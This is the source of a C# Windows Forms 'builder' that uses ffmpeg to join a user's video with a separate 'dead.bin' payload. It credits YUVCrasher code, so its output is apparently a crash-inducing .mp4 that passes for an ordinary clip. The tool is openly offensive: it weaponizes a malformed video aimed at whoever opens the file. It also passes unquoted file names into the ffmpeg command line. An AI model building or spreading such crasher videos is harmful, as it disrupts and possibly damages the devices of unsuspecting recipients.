using System;
using System.Collections.Generic;
using System.Threading;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Linq;
namespace dead_video
{
    public partial class gui : Form
    {
        public gui()
        {
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (textBoxInputFile.Text.Length == 0)
            {
                MessageBox.Show("The input name field is empty.", "WARN");
            }
            else if (textBoxOutputFile.Text.Length == 0)
            {
                MessageBox.Show("The output name field is empty.", "WARN");
            }
            else
            {
                var result = MessageBox.Show("Start build?", "Builder V1", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (result == DialogResult.Yes)
                {
                    btnStart.Enabled = false;
                    string inputName = textBoxInputFile.Text;
                    string outputName = textBoxOutputFile.Text + ".mp4";
                    if (!File.Exists(inputName)) { MessageBox.Show($"Input file {inputName} not found! It should be in the folder in the builder!", "ERROR!");}
                    else if (!File.Exists("ffmpeg.exe")) { MessageBox.Show("The ffmpeg file was not found!\nDownload it from the original author repository or from the official site(ffmpeg.org) and place it in the builder folder.", "ERROR!"); }
                    else if (!File.Exists("dead.bin")) { MessageBox.Show("The dead.bin file was not found!\nDownload it from the original author repository and place it in the builder folder.", "ERROR"); }
                    else
                    {
                        //The file creation code was taken from https://github.com/D3XX3R/YUVCrasher/blob/main/Program.cs which is a decompiled https://github.com/emlin2019/YUVCrasher
                        //Thank you guys!

                        string inject_file = RandomString(6) + ".txt";
                        File.WriteAllText(inject_file, $"file {inputName}\nfile dead.bin");
                        Process process = new Process();
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.FileName = "ffmpeg.exe";
                        process.StartInfo.Arguments = $" -y -f concat -safe 0 -i {inject_file} -codec copy {outputName}";
                        process.Start();
                        process.WaitForExit();
                        File.Delete(inject_file);

                        if (File.Exists(outputName)) { MessageBox.Show($"File {outputName} has been successfully created!", "COMPLITE"); }
                        else { MessageBox.Show($"File {outputName} not created!", "ERROR"); }
                    }
                }
            }
            btnStart.Enabled = true;
        }
        private static Random random = new Random();
        public  string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Range(1, length).Select(_ => chars[random.Next(chars.Length)]).ToArray());
        }


        public void lineChanger()
        {
            var rnd = new Random();
            while (true)
            {
                List<string> ColorList = new List<string>() { "#3F51B5", "#009688", "#FF5722", "#607D8B", "#FF9800", "#9C27B0", "#2196F3", "#EA676C", "#E41A4A", "#5978BB", "#018790", "#0E3441", "#00B0AD", "#721D47", "#EA4833", "#EF937E", "#F37521", "#A12059", "#126881", "#8BC240", "#364D5B", "#C7DC5B", "#0094BC", "#E4126B", "#43B76E", "#7BCFE9", "#B71C46" };
                this.rainbowTextBox.BackColor = ColorTranslator.FromHtml(ColorList[rnd.Next(0, ColorList.Count - 1)]);
                Thread.Sleep(500);
            }

        }
        public void startChanger()
        {
            Thread sender = new Thread(lineChanger);
            sender.IsBackground = true;
            sender.Start();
        }


        private void gui_Load(object sender, EventArgs e)
        {
            startChanger();
        }
    }
}
